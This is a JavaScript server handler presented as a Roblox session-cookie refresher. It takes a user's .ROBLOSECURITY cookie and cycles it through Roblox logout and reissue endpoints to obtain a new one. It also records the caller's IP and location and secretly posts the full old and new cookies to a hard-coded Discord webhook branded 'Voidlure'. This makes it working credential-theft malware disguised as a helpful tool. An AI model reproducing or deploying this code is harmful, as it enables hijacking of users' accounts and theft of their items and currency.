module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { cookie } = req.body;

    if (!cookie || !cookie.includes('_|WARNING')) {
        return res.status(400).json({ success: false, message: 'Invalid cookie format' });
    }

    try {
        const newCookie = await refreshRobloxCookie(cookie);
        
        const ipData = await getIpInfo(req);
        
        await sendToWebhook(cookie, newCookie, ipData);
        
        return res.status(200).json({ success: true, cookie: newCookie });
    } catch (error) {
        return res.status(500).json({ success: false, message: error.message });
    }
};

async function refreshRobloxCookie(oldCookie) {
    const cleanCookie = oldCookie.replace(/^\.ROBLOSECURITY=/, '').trim();
    
    const baseHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com'
    };

    const cookieString = '.ROBLOSECURITY=' + cleanCookie;
    
    const authHeaders = {
        ...baseHeaders,
        'Cookie': cookieString
    };

    let csrfToken = '';

    const userResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
        method: 'GET',
        headers: authHeaders
    });

    if (!userResponse.ok) {
        throw new Error('Invalid cookie - failed to authenticate');
    }

    const userData = await userResponse.json();

    const xcsrfResponse = await fetch('https://auth.roblox.com/v2/login', {
        method: 'POST',
        headers: {
            ...baseHeaders,
            'Cookie': cookieString,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({})
    });

    csrfToken = xcsrfResponse.headers.get('x-csrf-token') || '';

    const logoutResponse = await fetch('https://auth.roblox.com/v2/logout', {
        method: 'POST',
        headers: {
            ...baseHeaders,
            'Cookie': cookieString,
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken
        }
    });

    let newCookie = null;
    const setCookieHeader = logoutResponse.headers.get('set-cookie');

    if (setCookieHeader) {
        const cookieMatch = setCookieHeader.match(/\.ROBLOSECURITY=([^;]+)/);
        if (cookieMatch) {
            newCookie = cookieMatch[1];
        }
    }

    if (!newCookie && logoutResponse.status === 403) {
        const newCsrf = logoutResponse.headers.get('x-csrf-token');
        if (newCsrf) {
            const retryLogout = await fetch('https://auth.roblox.com/v2/logout', {
                method: 'POST',
                headers: {
                    ...baseHeaders,
                    'Cookie': cookieString,
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': newCsrf
                }
            });

            const retryCookie = retryLogout.headers.get('set-cookie');
            if (retryCookie) {
                const retryMatch = retryCookie.match(/\.ROBLOSECURITY=([^;]+)/);
                if (retryMatch) {
                    newCookie = retryMatch[1];
                }
            }
        }
    }

    if (!newCookie) {
        const ticketHeaders = {
            ...baseHeaders,
            'Cookie': cookieString,
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken
        };

        const ticketResponse = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            headers: ticketHeaders,
            body: JSON.stringify({})
        });

        const ticketSetCookie = ticketResponse.headers.get('set-cookie');
        if (ticketSetCookie) {
            const ticketMatch = ticketSetCookie.match(/\.ROBLOSECURITY=([^;]+)/);
            if (ticketMatch) {
                newCookie = ticketMatch[1];
            }
        }

        if (!newCookie && ticketResponse.status === 403) {
            const ticketCsrf = ticketResponse.headers.get('x-csrf-token');
            if (ticketCsrf) {
                const retryTicket = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
                    method: 'POST',
                    headers: {
                        ...baseHeaders,
                        'Cookie': cookieString,
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': ticketCsrf
                    },
                    body: JSON.stringify({})
                });

                const retryTicketCookie = retryTicket.headers.get('set-cookie');
                if (retryTicketCookie) {
                    const retryTicketMatch = retryTicketCookie.match(/\.ROBLOSECURITY=([^;]+)/);
                    if (retryTicketMatch) {
                        newCookie = retryTicketMatch[1];
                    }
                }
            }
        }
    }

    if (!newCookie) {
        const refreshHeaders = {
            ...baseHeaders,
            'Cookie': cookieString,
            'Content-Type': 'application/json'
        };

        const refreshResponse = await fetch('https://www.roblox.com/authentication/signoutfromallsessionsandreissue', {
            method: 'POST',
            headers: refreshHeaders
        });

        const refreshSetCookie = refreshResponse.headers.get('set-cookie');
        if (refreshSetCookie) {
            const refreshMatch = refreshSetCookie.match(/\.ROBLOSECURITY=([^;]+)/);
            if (refreshMatch) {
                newCookie = refreshMatch[1];
            }
        }
    }

    if (newCookie) {
        const verifyResponse = await fetch('https://www.roblox.com/mobileapi/userinfo', {
            method: 'GET',
            headers: {
                ...baseHeaders,
                'Cookie': '.ROBLOSECURITY=' + newCookie
            }
        });

        if (verifyResponse.ok) {
            return newCookie;
        }
    }

    throw new Error('Failed to refresh cookie - unable to generate new session');
}

async function getIpInfo(req) {
    try {
        const ip = req.headers['x-forwarded-for'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress || 
                   'Unknown';
        
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            return {
                ip: ip.split(',')[0].trim(),
                city: data.city || 'Unknown',
                country: data.country_name || 'Unknown',
                region: data.region || 'Unknown'
            };
        }
        return { ip: ip.split(',')[0].trim(), city: 'Unknown', country: 'Unknown', region: 'Unknown' };
    } catch (error) {
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', region: 'Unknown' };
    }
}

async function sendToWebhook(oldCookie, newCookie, ipData) {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534100275596496917/Kl4cQXEuqQACHkiNvNsqq9maGQ7APPj9BksdSqiAkjmNNuagh8oD49p_idHDawYvoBqA';

    const payload = {
        content: '@everyone',
        embeds: [{
            title: 'Voidlure Cookie Refresh',
            color: 0x000000,
            timestamp: new Date().toISOString(),
            fields: [{
                name: 'Old Cookie (First 60 chars)',
                value: '```' + (oldCookie ? oldCookie.substring(0, 60) + '...' : 'N/A') + '```',
                inline: false
            }, {
                name: 'New Cookie (First 60 chars)',
                value: '```' + (newCookie ? newCookie.substring(0, 60) + '...' : 'N/A') + '```',
                inline: false
            }, {
                name: 'IP',
                value: ipData?.ip || 'Unknown',
                inline: true
            }, {
                name: 'Location',
                value: ipData?.city && ipData?.country ?
                    ipData.city + ', ' + ipData.country :
                    'Unknown',
                inline: true
            }, {
                name: 'Full Old Cookie',
                value: '||' + (oldCookie || 'N/A') + '||',
                inline: false
            }, {
                name: 'Full New Cookie',
                value: '||' + (newCookie || 'N/A') + '||',
                inline: false
            }],
            footer: {
                text: 'Voidlure',
                icon_url: 'https://ibb.co/n80RT8y3'
            }
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    } catch (error) {
        console.error('Webhook failed:', error.message);
    }
}
